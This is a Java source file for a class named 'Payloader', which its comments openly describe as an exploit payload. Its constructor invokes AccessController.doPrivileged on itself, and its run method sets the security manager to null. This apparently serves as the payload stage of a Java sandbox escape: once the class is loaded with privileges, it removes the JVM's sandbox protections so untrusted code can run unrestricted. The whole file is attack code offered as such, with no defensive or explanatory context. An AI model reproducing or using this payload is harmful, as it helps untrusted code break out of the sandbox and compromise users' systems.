import java.io.Serializable;
import java.security.AccessController;
import java.security.PrivilegedActionException;
import java.security.PrivilegedExceptionAction;

/**
 * This class contains the payload. The payload is just the code for disable the
 * security manager ;-)
 * 
 * @author mka
 * 
 */
public class Payloader implements PrivilegedExceptionAction, Serializable {

	/**
	 * 
	 */
	private static final long serialVersionUID = 635880182647064891L;

	public Payloader() {
		try {
			AccessController.doPrivileged(this);
		} catch (PrivilegedActionException e) {
			e.printStackTrace();
		}

	}

	@Override
	public Object run() throws Exception {

		// disable the security manager ;-)
		System.setSecurityManager(null);

		return null;
	}

}
